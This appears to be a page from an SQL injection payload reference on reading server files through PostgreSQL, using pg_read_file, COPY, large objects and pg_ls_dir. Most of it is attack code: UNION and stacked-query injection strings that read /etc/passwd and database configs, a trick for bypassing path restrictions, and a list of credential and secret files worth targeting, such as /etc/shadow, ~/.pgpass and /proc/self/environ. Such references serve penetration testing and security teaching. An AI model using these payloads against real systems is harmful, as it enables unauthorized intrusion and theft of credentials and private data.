---
title: Reading Files
description: Techniques for reading files from the filesystem using PostgreSQL
category: Advanced Techniques
order: 16
tags: ["file operations", "pg_read_file", "privilege escalation"]
lastUpdated: 2025-12-07
---

## Reading Files

PostgreSQL provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To read files from PostgreSQL, you typically need:

1. Superuser privileges, OR
2. Membership in the `pg_read_server_files` role (PostgreSQL 11+)
3. The file must be readable by the `postgres` OS user

### pg_read_file() Function

The primary method for reading files (requires superuser):

```sql
-- Read entire file
SELECT pg_read_file('/etc/passwd');

-- Read specific bytes (offset, length)
SELECT pg_read_file('/etc/passwd', 0, 100);

-- Read with missing file handling (PostgreSQL 11+)
SELECT pg_read_file('/etc/passwd', missing_ok => true);
```

### pg_read_binary_file() Function

For reading binary files:

```sql
SELECT pg_read_binary_file('/path/to/file');

-- Convert to hex for display
SELECT encode(pg_read_binary_file('/path/to/binary'), 'hex');
```

### Using COPY

The `COPY` command can read files into a table:

```sql
-- Create a table to hold file contents
CREATE TABLE file_contents (line TEXT);

-- Read file into table
COPY file_contents FROM '/etc/passwd';

-- Query the contents
SELECT * FROM file_contents;

-- Clean up
DROP TABLE file_contents;
```

### Using Large Objects

Large objects can be used for file operations:

```sql
-- Import file as large object
SELECT lo_import('/etc/passwd');
-- Returns OID (e.g., 12345)

-- Read the large object
SELECT lo_get(12345);

-- Or create table from large object
CREATE TABLE lo_data (data TEXT);
SELECT lo_export(12345, '/tmp/output.txt');
```

### pg_ls_dir() Function

List directory contents (requires superuser):

```sql
-- List files in directory
SELECT pg_ls_dir('/etc');

-- List PostgreSQL data directory
SELECT pg_ls_dir(current_setting('data_directory'));
```

### Important Target Files

| File Path                                  | Description                       |
| ------------------------------------------ | --------------------------------- |
| `/etc/passwd`                              | System users                      |
| `/etc/shadow`                              | Password hashes (rarely readable) |
| `/var/lib/postgresql/data/pg_hba.conf`     | PostgreSQL authentication config  |
| `/var/lib/postgresql/data/postgresql.conf` | PostgreSQL main config            |
| `/var/www/html/config.php`                 | Web application config            |
| `/proc/version`                            | Kernel version                    |
| `/proc/self/environ`                       | Environment variables             |
| `~/.pgpass`                                | PostgreSQL password file          |

### Configuration File Locations

```sql
-- Get config file location
SELECT current_setting('config_file');

-- Get HBA file location
SELECT current_setting('hba_file');

-- Get data directory
SELECT current_setting('data_directory');
```

### Injection Examples

```sql
-- Read /etc/passwd
' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--

-- List directory
' UNION SELECT NULL,string_agg(pg_ls_dir('/etc'),E'\n'),NULL--

-- Read PostgreSQL config
' UNION SELECT NULL,pg_read_file(current_setting('config_file')),NULL--

-- Using COPY (stacked query required)
'; CREATE TABLE temp(data TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp--
```

### Bypassing Restrictions

#### Using Symlinks

If direct paths are blocked:

```sql
-- May follow symlinks if they exist
SELECT pg_read_file('/proc/self/root/etc/passwd');
```

#### Encoding Output

For binary files or to avoid display issues:

```sql
SELECT encode(pg_read_file('/etc/passwd')::bytea, 'base64');
SELECT encode(pg_read_file('/etc/passwd')::bytea, 'hex');
```

### PostgreSQL 11+ Role-Based Access

```sql
-- Check if user has file read privileges
SELECT pg_has_role(current_user, 'pg_read_server_files', 'member');
```

### Notes

- `pg_read_file()` is restricted to files in the data directory by default
- Superuser can read any file accessible to the postgres OS user
- PostgreSQL 11+ introduced `pg_read_server_files` role for granular access
- Files are read as the `postgres` system user
- Use `missing_ok => true` to avoid errors on missing files
